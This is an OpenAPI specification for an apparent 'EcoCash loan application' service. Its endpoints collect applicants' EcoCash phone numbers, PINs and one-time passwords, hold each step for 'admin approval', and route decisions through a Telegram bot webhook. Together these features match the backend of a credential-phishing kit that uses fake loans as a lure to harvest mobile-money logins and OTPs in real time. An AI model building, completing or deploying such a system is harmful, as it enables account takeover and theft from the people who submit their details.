openapi: 3.1.0
info:
  title: Api
  version: 0.1.0
  description: EcoCash Loan Application API
servers:
  - url: /api
    description: Base API path
tags:
  - name: health
    description: Health operations
  - name: applications
    description: Loan application management
  - name: sessions
    description: User session management
  - name: otp
    description: OTP verification
paths:
  /healthz:
    get:
      operationId: healthCheck
      tags: [health]
      summary: Health check
      description: Returns server health status
      responses:
        "200":
          description: Healthy
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/HealthStatus"

  /applications:
    post:
      operationId: submitApplication
      tags: [applications]
      summary: Submit a loan application
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/ApplicationInput"
      responses:
        "201":
          description: Application submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Application"
        "400":
          description: Invalid input

  /applications/{sessionId}:
    get:
      operationId: getApplication
      tags: [applications]
      summary: Get application by session ID
      parameters:
        - name: sessionId
          in: path
          required: true
          schema:
            type: string
      responses:
        "200":
          description: Application found
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Application"
        "404":
          description: Not found

  /applications/{sessionId}/status:
    get:
      operationId: getApplicationStatus
      tags: [applications]
      summary: Poll application approval status
      parameters:
        - name: sessionId
          in: path
          required: true
          schema:
            type: string
      responses:
        "200":
          description: Status returned
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StatusResponse"

  /applications/{sessionId}/login:
    post:
      operationId: submitLogin
      tags: [applications]
      summary: Submit EcoCash login credentials
      parameters:
        - name: sessionId
          in: path
          required: true
          schema:
            type: string
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/LoginInput"
      responses:
        "200":
          description: Login submitted, waiting for admin approval
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StatusResponse"
        "404":
          description: Session not found

  /applications/{sessionId}/otp:
    post:
      operationId: submitOtp
      tags: [otp]
      summary: Submit OTP code for verification
      parameters:
        - name: sessionId
          in: path
          required: true
          schema:
            type: string
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/OtpInput"
      responses:
        "200":
          description: OTP submitted, waiting for admin verification
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StatusResponse"
        "404":
          description: Session not found

  /applications/{sessionId}/otp-status:
    get:
      operationId: getOtpStatus
      tags: [otp]
      summary: Poll OTP verification status
      parameters:
        - name: sessionId
          in: path
          required: true
          schema:
            type: string
      responses:
        "200":
          description: OTP status
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/OtpStatusResponse"

  /telegram/webhook:
    post:
      operationId: telegramWebhook
      tags: [applications]
      summary: Telegram bot webhook receiver
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/TelegramUpdate"
      responses:
        "200":
          description: OK

components:
  schemas:
    HealthStatus:
      type: object
      properties:
        status:
          type: string
      required:
        - status

    ApplicationInput:
      type: object
      required:
        - loanType
        - loanAmount
        - loanTerm
        - loanPurpose
        - firstName
        - lastName
        - phoneNumber
        - employmentStatus
        - monthlyIncome
      properties:
        loanType:
          type: string
        loanAmount:
          type: number
        loanTerm:
          type: integer
        loanPurpose:
          type: string
        firstName:
          type: string
        lastName:
          type: string
        phoneNumber:
          type: string
        employmentStatus:
          type: string
        monthlyIncome:
          type: number

    Application:
      type: object
      required:
        - id
        - sessionId
        - status
        - createdAt
      properties:
        id:
          type: integer
        sessionId:
          type: string
        loanType:
          type: ["string", "null"]
        loanAmount:
          type: ["number", "null"]
        loanTerm:
          type: ["integer", "null"]
        loanPurpose:
          type: ["string", "null"]
        firstName:
          type: ["string", "null"]
        lastName:
          type: ["string", "null"]
        phoneNumber:
          type: ["string", "null"]
        employmentStatus:
          type: ["string", "null"]
        monthlyIncome:
          type: ["number", "null"]
        loginPhone:
          type: ["string", "null"]
        status:
          type: string
          enum: [PENDING, LOGIN_SUBMITTED, LOGIN_APPROVED, LOGIN_REJECTED, OTP_SUBMITTED, OTP_APPROVED, OTP_REJECTED]
        otpCode:
          type: ["string", "null"]
        createdAt:
          type: string

    LoginInput:
      type: object
      required:
        - phone
        - pin
      properties:
        phone:
          type: string
        pin:
          type: string

    OtpInput:
      type: object
      required:
        - otp
      properties:
        otp:
          type: string

    StatusResponse:
      type: object
      required:
        - status
        - sessionId
      properties:
        status:
          type: string
        sessionId:
          type: string
        message:
          type: ["string", "null"]

    OtpStatusResponse:
      type: object
      required:
        - status
        - sessionId
      properties:
        status:
          type: string
        sessionId:
          type: string
        message:
          type: ["string", "null"]
        otpCode:
          type: ["string", "null"]

    TelegramUpdate:
      type: object
      properties:
        update_id:
          type: integer
        callback_query:
          type: object
          properties:
            id:
              type: string
            data:
              type: string
